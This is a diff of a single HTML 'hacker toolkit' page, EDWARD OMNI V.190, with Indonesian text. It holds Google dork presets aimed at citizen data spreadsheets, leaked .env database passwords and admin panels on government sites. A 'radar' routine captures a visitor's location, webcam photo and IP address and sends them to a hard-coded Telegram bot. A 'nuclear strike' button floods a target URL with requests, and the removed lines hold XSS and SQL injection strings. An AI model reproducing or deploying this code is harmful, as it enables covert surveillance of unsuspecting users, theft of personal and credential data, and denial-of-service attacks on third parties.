@@ -3,70 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.185</title>
+    <title>EDWARD OMNI V.190</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
-        .master-name { text-align: center; font-size: 22px; font-weight: 900; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0 0 15px 0; text-transform: uppercase; }
+        .master-name { text-align: center; font-size: 22px; font-weight: 900; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 15px; text-transform: uppercase; }
         .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 15px; margin-bottom: 12px; }
-        h3 { margin: 0 0 10px 0; font-size: 10px; color: var(--neon); letter-spacing: 2px; text-transform: uppercase; }
+        h3 { margin: 0 0 10px 0; font-size: 10px; color: var(--neon); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 8px; }
         input, select { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,136,0.3); border-radius: 10px; color: #fff; padding: 10px; width: 100%; margin-bottom: 8px; font-size: 12px; }
         .btn { width: 100%; padding: 12px; border-radius: 10px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-scan { background: var(--neon); color: #000; }
-        .btn-radar { background: var(--blue); color: #000; box-shadow: 0 0 10px var(--blue); }
-        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
-        .btn-payload { background: #1a1a1a; color: var(--neon); border: 1px solid var(--neon); font-size: 9px; }
+        .btn-scan { background: var(--neon); color: #000; box-shadow: 0 0 10px var(--neon); }
+        .btn-radar { background: var(--blue); color: #000; }
+        .btn-atk { background: linear-gradient(45deg, var(--red), #bc13fe); color: #fff; }
         .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 8px; border-radius: 10px; text-align: center; color: var(--neon); font-size: 10px; background: rgba(0,0,0,0.3); margin-bottom: 10px; }
-        #webcamContainer { display: none; margin-top: 10px; border-radius: 15px; overflow: hidden; border: 1px solid var(--blue); }
-        #webcamLive { width: 100%; filter: sepia(100%) hue-rotate(80deg); }
-        .log-box { display: none; background: #000; color: var(--neon); font-size: 9px; padding: 10px; border-radius: 8px; height: 80px; overflow-y: auto; border: 1px solid rgba(0,255,136,0.2); }
-        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
         .radar-sweep { width: 120px; height: 120px; border: 2px solid var(--neon); border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rot 2s linear infinite; }
         @keyframes rot { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas { display: none; }
     </style>
 </head>
 <body>
-    <p class="master-name">EDWARD OMNI V.185</p>
-    <div class="mon-box">SYSTEM: ONLINE | RADAR: READY | MASTER: EDWARD-BAIK</div>
+    <p class="master-name">EDWARD OMNI V.190</p>
+    <div class="mon-box">MANTRA SYSTEM: OPTIMIZED | USER: EDWARD-BAIK</div>
 
     <div class="card">
         <h3>🎯 BUG HUNTER (MANTRA)</h3>
-        <input type="text" id="targetSite" placeholder="Target Site (go.id)">
-        <input type="text" id="mantraManual" placeholder="Mantra Manual (e.g. intitle:index.of)">
+        <input type="text" id="targetSite" placeholder="Target Site (misal: go.id)">
+        <input type="text" id="mantraManual" placeholder="KETIK MANTRA MANUAL DI SINI...">
         <select id="mantraAuto">
-            <option value="">-- PILIH MANTRA OTOMATIS --</option>
-            <option value='filetype:xls "data penduduk"'>DATA WARGA</option>
-            <option value='filetype:env "DB_PASSWORD"'>DATABASE PASS</option>
-            <option value='inurl:admin login'>ADMIN PANEL</option>
+            <option value="">-- ATAU PILIH OTOMATIS --</option>
+            <option value='filetype:xls "data penduduk"'>📂 DATA WARGA (EXCEL)</option>
+            <option value='filetype:env "DB_PASSWORD"'>🔑 DATABASE PASS</option>
+            <option value='inurl:admin login'>🚪 LOGIN ADMIN</option>
+            <option value='intitle:index.of'>📁 DIRECTORY LISTING</option>
         </select>
         <button class="btn btn-scan" onclick="castMantra()">CAST MANTRA 🔮</button>
     </div>
 
     <div class="card">
-        <h3>💉 PAYLOAD INJECTOR</h3>
-        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:5px;">
-            <button class="btn btn-payload" onclick="copyP(\"<script>alert('XSS')</script>\")">XSS</button>
-            <button class="btn btn-payload" onclick="copyP(\"' OR 1=1 --\")">SQLi</button>
-        </div>
-    </div>
-
-    <div class="card">
-        <h3>📡 ELITE RADAR & WEBCAM</h3>
+        <h3>📡 ELITE RADAR (PHOTO & GEO)</h3>
         <button class="btn btn-radar" onclick="activateRadar()">⚡ START RADAR SCAN</button>
         <button class="btn" style="background:transparent; border:1px solid var(--blue); color:var(--blue);" onclick="toggleWebcam()">🛰️ LIVE WEBCAM</button>
-        <div id="webcamContainer"><video id="webcamLive" autoplay playsinline></video></div>
+        <div id="webcamContainer" style="display:none; margin-top:10px; border-radius:15px; overflow:hidden; border:1px solid var(--blue);"><video id="webcamLive" autoplay playsinline style="width:100%;"></video></div>
     </div>
 
     <div class="card">
         <h3>🔥 NUCLEAR STRIKE</h3>
         <input type="text" id="targetAtk" placeholder="Target IP/URL">
         <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH NUCLEAR 🚀</button>
-        <div id="atkLog" class="log-box"></div>
     </div>
 
-    <div id="radarOverlay"><div class="radar-sweep"></div><p style="color:var(--neon); margin-top:20px;">EXFILTRATING DATA...</p></div>
+    <div id="radarOverlay"><div class="radar-sweep"></div><p id="rStatus" style="color:var(--neon); margin-top:20px; font-family:monospace;">INITIALIZING...</p></div>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -74,51 +62,67 @@
         const CHAT_ID = '7898572558';
         let isAtk = false;
 
-        function copyP(p) { navigator.clipboard.writeText(p); alert("Payload Copied!"); }
-
         function castMantra() {
             const t = document.getElementById('targetSite').value;
-            const m = document.getElementById('mantraManual').value || document.getElementById('mantraAuto').value;
-            if(!m) return alert("Mantra Kosong!");
-            window.open("https://www.google.com/search?q=" + encodeURIComponent((t ? `site:${t} ` : "") + m));
+            const manual = document.getElementById('mantraManual').value;
+            const auto = document.getElementById('mantraAuto').value;
+            
+            // Prioritas: Manual > Auto
+            const mantra = manual || auto;
+            
+            if(!mantra) return alert("Mantra tidak boleh kosong, Master!");
+            const query = t ? `site:${t} ${mantra}` : mantra;
+            window.open("https://www.google.com/search?q=" + encodeURIComponent(query));
+        }
+
+        async function activateRadar() {
+            const overlay = document.getElementById('radarOverlay');
+            const status = document.getElementById('rStatus');
+            overlay.style.display='flex';
+            try {
+                status.innerText = "LOCKING LOCATION...";
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    status.innerText = "CAPTURING VISUAL...";
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const video = document.createElement('video');
+                    video.srcObject = stream; await video.play();
+
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                        
+                        status.innerText = "EXFILTRATING DATA...";
+                        const ipRes = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipRes.json();
+
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'radar.jpg');
+                        fd.append('caption', `🔱 RADAR SUCCESS\n🌐 IP: ${ipData.ip}\n📍 Loc: https://maps.google.com/maps?q={pos.coords.latitude},${pos.coords.longitude}\n👤 Master: EDWARD-BAIK`);
+
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                        overlay.style.display='none';
+                        alert("DATA SENT TO COMMAND CENTER!");
+                    }, 2000);
+                }, () => { overlay.style.display='none'; alert("GPS Denied"); });
+            } catch(e) { overlay.style.display='none'; alert("System Busy"); }
         }
 
         async function toggleWebcam() {
-            const c = document.getElementById('webcamContainer');
             const v = document.getElementById('webcamLive');
+            const c = document.getElementById('webcamContainer');
             if(v.srcObject) { v.srcObject.getTracks().forEach(t => t.stop()); c.style.display='none'; v.srcObject=null; }
-            else {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                v.srcObject = s; c.style.display='block';
-            }
-        }
-
-        function activateRadar() {
-            document.getElementById('radarOverlay').style.display='flex';
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const v = document.createElement('video'); v.srcObject = s; await v.play();
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'radar.jpg');
-                    fd.append('caption', `🔱 RADAR HIT\n📍 Loc: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n👤 User: EDWARD-BAIK`);
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    s.getTracks().forEach(t => t.stop());
-                    document.getElementById('radarOverlay').style.display='none';
-                    alert("DATA EXFILTRATED!");
-                }, 2000);
-            }, () => { document.getElementById('radarOverlay').style.display='none'; alert("GPS Denied"); });
+            else { const s = await navigator.mediaDevices.getUserMedia({ video: true }); v.srcObject = s; c.style.display='block'; }
         }
 
         function toggleAtk() {
             const t = document.getElementById('targetAtk').value;
-            const log = document.getElementById('atkLog');
             if(!t || isAtk) { if(isAtk) location.reload(); return; }
-            isAtk = true; log.style.display='block'; document.getElementById('atkBtn').innerText="STOP 🛑";
-            setInterval(() => { if(isAtk) { new Image().src="https://"+t+"/?v="+Math.random(); log.innerHTML = `<div>> HIT ${t}</div>` + log.innerHTML; } }, 100);
+            isAtk = true; document.getElementById('atkBtn').innerText = "STOP 🛑";
+            setInterval(() => { if(isAtk) new Image().src="https://"+t+"/?v="+Math.random(); }, 100);
         }
     </script>
 </body>
